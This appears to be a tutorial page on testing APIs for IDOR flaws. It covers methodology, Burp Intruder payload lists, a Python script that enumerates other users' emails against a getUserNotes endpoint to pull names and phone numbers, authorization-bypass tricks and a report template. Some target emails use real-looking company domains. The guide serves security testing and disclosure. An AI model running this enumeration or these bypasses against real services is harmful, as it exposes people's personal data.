<h1 class="doc-title">Testing Techniques</h1>
<p class="doc-subtitle">Systematic approaches to discovering IDOR vulnerabilities in APIs</p>

<div class="section">
    <h2>Testing Methodology</h2>
    <p>
        Finding IDOR vulnerabilities requires systematic testing of all endpoints that handle 
        user-specific data. Follow this methodology:
    </p>
    
    <ol>
        <li><strong>Map the application</strong> - Identify all API endpoints</li>
        <li><strong>Identify object references</strong> - Find IDs, emails, usernames in requests</li>
        <li><strong>Create test accounts</strong> - Set up attacker and victim accounts</li>
        <li><strong>Test horizontal access</strong> - Try accessing other users' resources</li>
        <li><strong>Test vertical access</strong> - Try accessing higher-privilege resources</li>
        <li><strong>Document findings</strong> - Record vulnerable endpoints and impact</li>
    </ol>
</div>

<div class="section">
    <h2>Parameter Types to Test</h2>
    <p>IDOR vulnerabilities can exist in various parameter types:</p>
    
    <table>
        <tr>
            <th>Parameter Type</th>
            <th>Examples</th>
            <th>Test Approach</th>
        </tr>
        <tr>
            <td>Numeric IDs</td>
            <td><code>user_id=123</code>, <code>note_id=456</code></td>
            <td>Increment/decrement, use other users' IDs</td>
        </tr>
        <tr>
            <td>Email Addresses</td>
            <td><code>email=user@example.com</code></td>
            <td>Replace with other users' emails</td>
        </tr>
        <tr>
            <td>Usernames</td>
            <td><code>username=john_doe</code></td>
            <td>Try other known usernames</td>
        </tr>
        <tr>
            <td>UUIDs</td>
            <td><code>id=a1b2c3d4-e5f6...</code></td>
            <td>Use UUIDs from other responses</td>
        </tr>
        <tr>
            <td>Encoded Values</td>
            <td><code>ref=YWRtaW4=</code> (base64)</td>
            <td>Decode, modify, re-encode</td>
        </tr>
        <tr>
            <td>Path Parameters</td>
            <td><code>/users/123/notes</code></td>
            <td>Change path segments</td>
        </tr>
    </table>
</div>

<div class="section">
    <h2>Tools for IDOR Testing</h2>
    
    <h3>Burp Suite</h3>
    <p>Essential features for IDOR testing:</p>
    <ul>
        <li><strong>Repeater:</strong> Modify and replay requests with different IDs</li>
        <li><strong>Intruder:</strong> Automate enumeration with ID wordlists</li>
        <li><strong>Comparer:</strong> Diff responses to detect access control differences</li>
        <li><strong>Logger++:</strong> Extension for advanced request logging</li>
        <li><strong>Autorize:</strong> Extension for automated authorization testing</li>
    </ul>
    
    <div class="code-block">
<span class="comment"># Burp Intruder payload positions for IDOR</span>
POST /api/getUserNotes HTTP/1.1

{"params":{"updates":[{"value":{"userEmail":"§attacker@example.com§"}}]}}

<span class="comment"># Payload: List of target emails</span>
victim1@mtnbusiness.com
ceo@bigcorp.ng
finance@acme.com.ng
admin@mtnmobad.com
    </div>
    
    <h3>Custom Scripts</h3>
    <div class="code-block">
<span class="comment"># Python script for IDOR testing</span>
<span class="keyword">import</span> requests

session = requests.Session()

<span class="comment"># Login as attacker</span>
session.post('http://target/login', data={
    'email': 'attacker@example.com',
    'password': 'attacker123'
})

<span class="comment"># Test IDOR with different emails</span>
test_emails = [
    'victim1@mtnbusiness.com',
    'ceo@bigcorp.ng',
    'admin@mtnmobad.com'
]

<span class="keyword">for</span> email <span class="keyword">in</span> test_emails:
    response = session.post('http://target/api/getUserNotes', json={
        'params': {
            'updates': [{
                'param': 'user',
                'value': {'userEmail': email},
                'op': 'a'
            }]
        }
    })
    
    <span class="keyword">if</span> response.status_code == 200:
        data = response.json()
        <span class="keyword">if</span> 'user' <span class="keyword">in</span> data:
            print(f'[VULN] IDOR confirmed for: {email}')
            print(f'       Name: {data["user"]["full_name"]}')
            print(f'       Phone: {data["user"]["phone"]}')
    </div>
</div>

<div class="section">
    <h2>Testing Checklist</h2>
    <p>For each API endpoint that handles user data:</p>
    
    <div class="note-box">
        <h4>📋 IDOR Testing Checklist</h4>
        <ul style="margin: 0.5rem 0 0 1.5rem;">
            <li>☐ Can User A read User B's data by changing the ID?</li>
            <li>☐ Can User A update User B's data?</li>
            <li>☐ Can User A delete User B's data?</li>
            <li>☐ Are sequential IDs enumerable?</li>
            <li>☐ Does removing the auth cookie return different error vs wrong user?</li>
            <li>☐ Can a regular user access admin resources by changing IDs?</li>
            <li>☐ Are indirect references (email, username) validated?</li>
            <li>☐ Does the API leak existence of resources (404 vs 403)?</li>
        </ul>
    </div>
</div>

<div class="section">
    <h2>Detecting Vulnerable Responses</h2>
    <p>Signs that indicate successful IDOR exploitation:</p>
    
    <table>
        <tr>
            <th>Indicator</th>
            <th>Description</th>
        </tr>
        <tr>
            <td><strong>200 OK with data</strong></td>
            <td>Server returns the requested resource (clear vulnerability)</td>
        </tr>
        <tr>
            <td><strong>Different data structure</strong></td>
            <td>Response contains fields not present in your own data</td>
        </tr>
        <tr>
            <td><strong>Different user info</strong></td>
            <td>Name, email, or other identifiers don't match your account</td>
        </tr>
        <tr>
            <td><strong>No error on foreign ID</strong></td>
            <td>Accessing ID you don't own doesn't trigger 403/401</td>
        </tr>
    </table>
    
    <h3>Response Comparison Example</h3>
    <div class="code-block">
<span class="comment">// Your own data (baseline)</span>
{"user": {"email": "attacker@example.com", "name": "Attacker"}}

<span class="comment">// Accessing another user (VULNERABLE - different user returned)</span>
{"user": {"email": "victim@example.com", "name": "Victim User"}}

<span class="comment">// Secure response (should see this instead)</span>
{"error": "Forbidden", "message": "Access denied"}
    </div>
</div>

<div class="section">
    <h2>Advanced Techniques</h2>
    
    <h3>1. Parameter Pollution</h3>
    <p>Send multiple values for the same parameter:</p>
    <div class="code-block">
<span class="comment">// Try sending both your ID and victim's ID</span>
{"userEmail": "attacker@example.com", "userEmail": "victim@example.com"}

<span class="comment">// Or in query string</span>
/api/notes?user_id=100&user_id=200
    </div>
    
    <h3>2. HTTP Method Switching</h3>
    <p>Sometimes different methods have different access controls:</p>
    <div class="code-block">
GET /api/users/200 → 403 Forbidden
POST /api/users/200 → 200 OK (bug!)
    </div>
    
    <h3>3. Case Sensitivity</h3>
    <p>Test if authorization is case-sensitive:</p>
    <div class="code-block">
<span class="comment">// Original blocked</span>
{"email": "Admin@example.com"} → 403

<span class="comment">// Try variations</span>
{"email": "admin@example.com"} → 200? 
{"email": "ADMIN@EXAMPLE.COM"} → 200?
    </div>
    
    <h3>4. Encoding Bypass</h3>
    <p>Try URL encoding or other transformations:</p>
    <div class="code-block">
<span class="comment">// Plain email blocked</span>
admin@example.com → 403

<span class="comment">// URL encoded</span>
admin%40example.com → 200?

<span class="comment">// Unicode variations</span>
ａdmin@example.com → 200?
    </div>
</div>

<div class="section">
    <h2>Reporting IDOR Vulnerabilities</h2>
    <p>When documenting IDOR findings:</p>
    
    <ul>
        <li><strong>Endpoint:</strong> Full URL and HTTP method</li>
        <li><strong>Parameter:</strong> Which parameter is vulnerable</li>
        <li><strong>Steps:</strong> Clear reproduction steps</li>
        <li><strong>Impact:</strong> What data/actions are exposed</li>
        <li><strong>Severity:</strong> Based on data sensitivity and exploitability</li>
        <li><strong>Proof:</strong> Screenshots, request/response samples</li>
    </ul>
    
    <div class="code-block">
<span class="comment">## IDOR Report Template</span>

**Title:** IDOR in getUserNotes API exposes user PII

**Severity:** High

**Endpoint:** POST /api/getUserNotes.php

**Vulnerable Parameter:** userEmail in JSON body

**Steps to Reproduce:**
1. Log in as attacker@example.com
2. Send POST to /api/getUserNotes.php
3. Change userEmail from own email to victim1@mtnbusiness.com
4. Observe victim's PII in response

**Impact:** 
- Full name, phone number, physical address exposed
- Tax IDs and bank account numbers leaked
- Private notes accessible to any authenticated user

**Recommendation:**
Add server-side authorization check:
if ($requestedEmail !== $_SESSION['email']) { return 403; }
    </div>
</div>

<div class="warning-box">
    <h4>⚠️ Responsible Disclosure</h4>
    <p>
        Always follow responsible disclosure practices. Report vulnerabilities privately to the 
        vendor and allow reasonable time for remediation before public disclosure.
    </p>
</div>
